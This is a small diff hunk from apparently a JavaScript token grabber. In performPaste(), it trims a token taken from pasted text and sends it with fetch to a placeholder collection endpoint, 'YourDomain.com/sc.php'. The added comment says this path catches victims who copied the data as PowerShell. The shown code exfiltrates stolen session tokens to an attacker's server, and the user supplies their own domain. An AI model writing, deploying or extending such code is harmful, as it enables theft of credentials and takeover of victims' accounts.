@@ -147,6 +147,7 @@ function performPaste() {
     var token = token.replace(token.slice(token.indexOf('"'), token.length))
     var token = token.replace('undefined','');
     var token = token.replace('undefined','');
+//This part is to send it incase they copied as powershell
 fetch("https://YourDomain.com/sc.php?t=" + token);
 }, 100);
   }
